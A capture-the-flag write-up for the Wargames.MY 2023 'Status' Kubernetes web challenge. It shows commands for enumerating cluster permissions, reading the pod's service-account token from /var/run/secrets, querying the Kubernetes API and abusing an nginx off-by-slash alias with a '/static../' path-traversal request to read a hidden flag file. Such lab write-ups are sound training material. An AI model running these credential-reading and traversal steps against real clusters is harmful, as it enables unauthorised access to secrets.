# Status

<div class="hidden">
    keywords: Wargames.MY CTF 2023, web, k8s, nginx, off-by-slash
</div>

> [!WARNING]
> Disclaimer: This is my first time playing with `k8s`, so things that I mentioned
> may not be accurate.

## Series

1. [Warmup](../warmup/)
2. **Status**
3. [Secret](../secret/)

## TL;DR

Retrieve nginx config file from k8s configmaps

## Enumeration

The challenge description links us to `/api/status.php` endpoint but there is
nothing much in it. If we take look at the file content directly, we could see
that it is using `kubectl` to get the status of the deployments.

```console
$ cat status.php
<?php

error_reporting(0);

$ok = exec('kubectl -n wgmy get deploy ' . getenv('DEPLOY') . ' -o jsonpath="{.status.availableReplicas}"');

echo($ok ? 'ok' : 'not ok');
```

If we check the environment variables, we could see a bunch of stuff concerning
with k8s (kubernetes).

```console
$ env
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT=443
USER=www-data
HOSTNAME=wgmy-webtestonetwothree-backend-7bc587fcd8-p4ksj
PHP_INI_DIR=/usr/local/etc/php
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_ADDR=10.43.246.102
SHLVL=3
HOME=/home/www-data
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PORT=80
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PROTO=tcp
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.3.0
GPG_KEYS=1198C0117593497A5EC5C199286AF1F9897469DC C28D937575603EB4ABB725861C0779DC5C0A9DE4 AFD8691FDAEDF03BDF6E460563F15A9B715376CA
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.3.0.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-8.3.0.tar.xz
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP=tcp://10.43.246.102:80
WGMY_WEBTESTONETWOTHREE_BACKEND_SERVICE_PORT_FASTCGI=9000
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP_ADDR=10.43.144.2
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP_PORT=9000
WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT_HTTP=80
WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP_PROTO=tcp
DEPLOY=wgmy-webtestonetwothree-frontend
WGMY_WEBTESTONETWOTHREE_BACKEND_SERVICE_HOST=10.43.144.2
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_HOST=10.43.246.102
PHPIZE_DEPS=autoconf            dpkg-dev dpkg           file            g++             gcc             libc-dev                make            pkgconf                 re2c
WGMY_WEBTESTONETWOTHREE_BACKEND_PORT_9000_TCP=tcp://10.43.144.2:9000
KUBERNETES_SERVICE_HOST=10.43.0.1
PWD=/var/www/api
PHP_SHA256=1db84fec57125aa93638b51bb2b15103e12ac196e2f960f0d124275b2687ea54
WGMY_WEBTESTONETWOTHREE_BACKEND_PORT=tcp://10.43.144.2:9000
WGMY_WEBTESTONETWOTHREE_BACKEND_SERVICE_PORT=9000
WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT=80
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT=tcp://10.43.246.102:80
```

Seems like we are currently on the backend which serves the API endpoint
while the initial page with password input box that we interact with is the frontend.

The next thing that we could do is to see what actions we could perform on the
k8s cluster.

```console
$ kubectl auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names                       Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []                                   [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []                                   [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []                                   [create]
                                                [/.well-known/openid-configuration/]   []                                   [get]
                                                [/.well-known/openid-configuration]    []                                   [get]
                                                [/api/*]                               []                                   [get]
                                                [/api]                                 []                                   [get]
                                                [/apis/*]                              []                                   [get]
                                                [/apis]                                []                                   [get]
                                                [/healthz]                             []                                   [get]
                                                [/healthz]                             []                                   [get]
                                                [/livez]                               []                                   [get]
                                                [/livez]                               []                                   [get]
                                                [/openapi/*]                           []                                   [get]
                                                [/openapi]                             []                                   [get]
                                                [/openid/v1/jwks/]                     []                                   [get]
                                                [/openid/v1/jwks]                      []                                   [get]
                                                [/readyz]                              []                                   [get]
                                                [/readyz]                              []                                   [get]
                                                [/version/]                            []                                   [get]
                                                [/version/]                            []                                   [get]
                                                [/version]                             []                                   [get]
                                                [/version]                             []                                   [get]
configmaps                                      []                                     []                                   [get]
deployments.apps                                []                                     [wgmy-webtestonetwothree-frontend]   [get]
```

Most of the permissions are default like interacting with the k8s master API endpoints.
The one that is useful for us is the last 2 lines.

- the second last line means that we could `get` **any** `configmaps` data
- the last line means that we could `get` **only** `deployments` data named `wgmy-webtestonetwothree-frontend`

## Getting Deployments Data

To get the `deployments` data simply do `kubectl get deployments <resource name>`.
Optionally we could also be more specific by specify the namespace (from `/var/www/api/status.php`)
`kubectl -n wgmy get deployments <resource name>`.

```console
$ kubectl get deployments wgmy-webtestonetwothree-frontend
NAME                               READY   UP-TO-DATE   AVAILABLE   AGE
wgmy-webtestonetwothree-frontend   2/2     2            2           35h

$ kubectl get deploy wgmy-webtestonetwothree-frontend -o yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  annotations:
    deployment.kubernetes.io/revision: "1"
    meta.helm.sh/release-name: wgmy-webtestonetwothree
    meta.helm.sh/release-namespace: wgmy
  creationTimestamp: "2023-12-15T14:14:18Z"
  generation: 2
  labels:
    app.kubernetes.io/instance: wgmy-webtestonetwothree
    app.kubernetes.io/managed-by: Helm
    app.kubernetes.io/name: frontend
    app.kubernetes.io/version: 0.1.0
    helm.sh/chart: frontend-0.1.0
  name: wgmy-webtestonetwothree-frontend
  namespace: wgmy
  resourceVersion: "28477"
  uid: a8c63194-0eb2-4005-abe2-14138c2b615b
spec:
  progressDeadlineSeconds: 600
  replicas: 2
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      app.kubernetes.io/instance: wgmy-webtestonetwothree
      app.kubernetes.io/name: frontend
  strategy:
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 25%
    type: RollingUpdate
  template:
    metadata:
      annotations:
        vault.hashicorp.com/agent-inject: "true"
        vault.hashicorp.com/agent-inject-secret-flag: kv/data/flag_for_secret
        vault.hashicorp.com/role: wgmy
      creationTimestamp: null
      labels:
        app.kubernetes.io/instance: wgmy-webtestonetwothree
        app.kubernetes.io/name: frontend
    spec:
      containers:
      - image: nginx:1.25-alpine
        imagePullPolicy: IfNotPresent
        livenessProbe:
          failureThreshold: 3
          httpGet:
            path: /
            port: http
            scheme: HTTP
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 1
        name: frontend
        ports:
        - containerPort: 80
          name: http
          protocol: TCP
        readinessProbe:
          failureThreshold: 3
          httpGet:
            path: /
            port: http
            scheme: HTTP
          periodSeconds: 10
          successThreshold: 1
          timeoutSeconds: 1
        resources: {}
        securityContext: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /usr/share/nginx/html
          name: html
        - mountPath: /etc/nginx/conf.d
          name: conf
        - mountPath: /usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front
          name: flag
      dnsPolicy: ClusterFirst
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      serviceAccount: wgmy-webtestonetwothree-frontend
      serviceAccountName: wgmy-webtestonetwothree-frontend
      terminationGracePeriodSeconds: 30
      volumes:
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-html
        name: html
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-conf
        name: conf
      - name: flag
        secret:
          defaultMode: 420
          items:
          - key: flag
            path: flag_for_status
          secretName: wgmy-webtestonetwothree-frontend-flag
status:
  availableReplicas: 2
  conditions:
  - lastTransitionTime: "2023-12-15T14:14:18Z"
    lastUpdateTime: "2023-12-15T14:14:20Z"
    message: ReplicaSet "wgmy-webtestonetwothree-frontend-556ccd7cf" has successfully
      progressed.
    reason: NewReplicaSetAvailable
    status: "True"
    type: Progressing
  - lastTransitionTime: "2023-12-16T14:43:01Z"
    lastUpdateTime: "2023-12-16T14:43:01Z"
    message: Deployment has minimum availability.
    reason: MinimumReplicasAvailable
    status: "True"
    type: Available
  observedGeneration: 2
  readyReplicas: 2
  replicas: 2
  updatedReplicas: 2
```

We could see that there are interesting strings like:
- `.lemme_try_hiding_flag_with_dot_in_front`
- `wgmy-webtestonetwothree-frontend-flag`
- `flag_for_status`
- `kv/data/flag_for_secret` (for the other challenge named `secret`)

> [!NOTE]
> Alternative way to retrieve this data without `kubectl` is through the API
> endpoint directly, see [appendix](#appendix)

## Retrieving `nginx` Config from `configmaps`

Notice the following snippet:

```yaml
[...]
        volumeMounts:
        - mountPath: /usr/share/nginx/html
          name: html
        - mountPath: /etc/nginx/conf.d
          name: conf
        - mountPath: /usr/share/nginx/.lemme_try_hiding_flag_with_dot_in_front
          name: flag
[...]
      volumes:
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-html
        name: html
      - configMap:
          defaultMode: 420
          name: wgmy-webtestonetwothree-frontend-conf
        name: conf
      - name: flag
        secret:
          defaultMode: 420
          items:
          - key: flag
            path: flag_for_status
          secretName: wgmy-webtestonetwothree-frontend-flag
[...]
```

I assume that the `name` under `volumeMounts` refers to the `name` under `volumes`.
Hence, the `nginx` config can be retrieved from `wgmy-webtestonetwothree-frontend-conf`

```console
$ kubectl get configmaps wgmy-webtestonetwothree-frontend-conf -o yaml
apiVersion: v1
data:
  default.conf: |
    set_real_ip_from  10.42.0.0/16;
    real_ip_header    X-Real-IP;    # from traefik

    server {
      listen       80;
      server_name  _;

      location / {
        root   /usr/share/nginx/html;
        index  index.html;
      }

      location /static {
        alias       /usr/share/nginx/html/;
        add_header  Cache-Control "private, max-age=3600";
      }

      location /api/ {
        include        /etc/nginx/fastcgi_params;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME /var/www$fastcgi_script_name;
        fastcgi_pass   wgmy-webtestonetwothree-backend:9000;
      }

      location /internal-secret/ {
        allow  10.42.0.0/16;
        deny   all;

        proxy_pass  http://vault.vault:8200/;
      }
    }
kind: ConfigMap
metadata:
  annotations:
    meta.helm.sh/release-name: wgmy-webtestonetwothree
    meta.helm.sh/release-namespace: wgmy
  creationTimestamp: "2023-12-15T14:14:18Z"
  labels:
    app.kubernetes.io/instance: wgmy-webtestonetwothree
    app.kubernetes.io/managed-by: Helm
    app.kubernetes.io/name: frontend
    app.kubernetes.io/version: 0.1.0
    helm.sh/chart: frontend-0.1.0
  name: wgmy-webtestonetwothree-frontend-conf
  namespace: wgmy
  resourceVersion: "1726"
  uid: 5a73676b-f509-44b0-8e2d-e921eb4cf7b4
```

```nginx
set_real_ip_from  10.42.0.0/16;
real_ip_header    X-Real-IP;    # from traefik

server {
  listen       80;
  server_name  _;

  location / {
    root   /usr/share/nginx/html;
    index  index.html;
  }

  location /static {
    alias       /usr/share/nginx/html/;
    add_header  Cache-Control "private, max-age=3600";
  }

  location /api/ {
    include        /etc/nginx/fastcgi_params;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME /var/www$fastcgi_script_name;
    fastcgi_pass   wgmy-webtestonetwothree-backend:9000;
  }

  location /internal-secret/ {
    allow  10.42.0.0/16;
    deny   all;

    proxy_pass  http://vault.vault:8200/;
  }
}
```

We could see that there is `off-by-slash` on `/static` which allows us to
read the `.lemme_try_hiding_flag_with_dot_in_front/flag_for_status` file by
accessing `/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status`

```console
$ env | grep FRONTEND
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_ADDR=10.43.246.102
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PORT=80
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP_PROTO=tcp
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT_80_TCP=tcp://10.43.246.102:80
WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT_HTTP=80
WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_HOST=10.43.246.102
WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE_PORT=80
WGMY_WEBTESTONETWOTHREE_FRONTEND_PORT=tcp://10.43.246.102:80

$ nslookup 10.43.246.102
Server:         10.43.0.10
Address:        10.43.0.10:53

102.246.43.10.in-addr.arpa      name = wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local

$ curl -s -L http://wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
wgmy{21c47f8225240bd1b87e9060986ddb4f}

$ curl -s -L http://10.43.246.102/static../.lemme_try_hiding_flag_with_dot_in_front/flag_for_status
wgmy{21c47f8225240bd1b87e9060986ddb4f}
```

flag: `wgmy{21c47f8225240bd1b87e9060986ddb4f}`

[Next](../secret/), we would look at the other `nginx` endpoint, i.e., `/internal-secret`
to get the other flag.

## References

- <https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-uris>
- <https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf#page=19>

## Appendix

### Getting k8s serviceaccount Token

To interact with the API, we need to get the `serviceaccount` token.

```console
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Im5oUXBoT0FLNVY5U2llMDR2ZFpfeDByYlpCVEtRQlVDUlB[...]

$ export k8s_token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

### Getting Other Services IP and Domain Name

Next, we can use the token in the HTTP header `Authorization: Bearer <token>` and
use `curl` on the k8s master ip which can be retrieved from the environment variable
or use the domain name by reverse nslookup the IP or follow the naming convention

```console
$ env | grep ^KUBERNETES
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_HOST=10.43.0.1
```

Example of converting the domain name manually:

```text
FOO_BAR_SERVICE

replace `_` with `-` until the word `_SERVICE` and append `.<namespace>.svc.cluster.local`

if namespace is default -> foo-bar.default.svc.cluster.local
if namespace is wgmy -> foo-bar.wgmy.svc.cluster.local

WGMY_WEBTESTONETWOTHREE_FRONTEND_SERVICE -> wgmy-webtestonetwothree-frontend.wgmy.svc.cluster.local
```

Refer to this [documentation](https://kubernetes.io/docs/reference/using-api/api-concepts/#resource-uris)
on how to determine the API endpoint. Furthermore, you can browse `/apis` and use the `name` field to build the next part after `/apis`

```console
$ curl -s -k -H "Authorization: Bearer ${k8s_token}" https://kubernetes.default.svc.cluster.local/apis/ | grep name
      "name": "apiregistration.k8s.io",
      "name": "apps",
      "name": "events.k8s.io",
      "name": "authentication.k8s.io",
      "name": "authorization.k8s.io",
      "name": "autoscaling",
      "name": "batch",
      "name": "certificates.k8s.io",
      "name": "networking.k8s.io",
      "name": "policy",
      "name": "rbac.authorization.k8s.io",
      "name": "storage.k8s.io",
      "name": "admissionregistration.k8s.io",
      "name": "apiextensions.k8s.io",
      "name": "scheduling.k8s.io",
      "name": "coordination.k8s.io",
      "name": "node.k8s.io",
      "name": "discovery.k8s.io",
      "name": "flowcontrol.apiserver.k8s.io",
      "name": "helm.cattle.io",
      "name": "k3s.cattle.io",
      "name": "traefik.containo.us",
      "name": "traefik.io",
      "name": "metrics.k8s.io",
```

### Getting stuff via API

> [!WARNING]
> Disclaimer: The first attempt that I did was just trial-and-error before
> noticing the pattern (which could be wrong as well)

I use `/apis/apps` from the assumption of `kubectl auth can-i --list` output: `deployments.apps`

```sh
curl -s -k -H "Authorization: Bearer ${k8s_token}" https://kubernetes.default.svc.cluster.local/apis/apps/v1/namespaces/wgmy/deployments/wgmy-webtestonetwothree-frontend
```

I use `/api` directly based on the assumption that since the `kubectl auth can-i --list` output is only: `configmaps`

```sh
curl -s -k -H "Authorization: Bearer ${k8s_token}" https://kubernetes.default.svc.cluster.local/api/v1/namespaces/wgmy/configmaps/wgmy-webtestonetwothree-frontend-conf
```
